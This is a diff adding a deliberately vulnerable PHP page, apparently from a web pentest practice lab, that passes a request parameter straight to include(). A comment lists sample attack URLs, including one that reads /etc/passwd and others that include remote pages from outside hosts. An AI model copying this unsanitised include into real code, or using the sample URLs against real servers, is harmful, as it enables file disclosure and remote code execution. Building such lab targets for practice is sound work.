@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Local File Inclusion</title>
+</head>
+<body>
+
+		<h1>Local File Inclusion</h1>
+
+		<?php
+
+
+				if (isset($_REQUEST["file"])) {
+					
+					include($_REQUEST["file"]);
+
+				}
+
+		?>
+
+
+<!--
+
+	192.168.1.45/webpentest/local-file-inclusion.php?file=index.html
+
+	http://192.168.1.45/webpentest/local-file-inclusion.php?file=phpinfo.php
+
+	http://192.168.1.45/webpentest/local-file-inclusion.php?file=https://www.google.com/
+
+	http://192.168.1.45/webpentest/local-file-inclusion.php?file=http://192.168.1.6/phpinfo.php
+
+	http://192.168.1.45/webpentest/local-file-inclusion.php?file=/etc/passwd
+
+
+
+-->
+</body>
+</html>
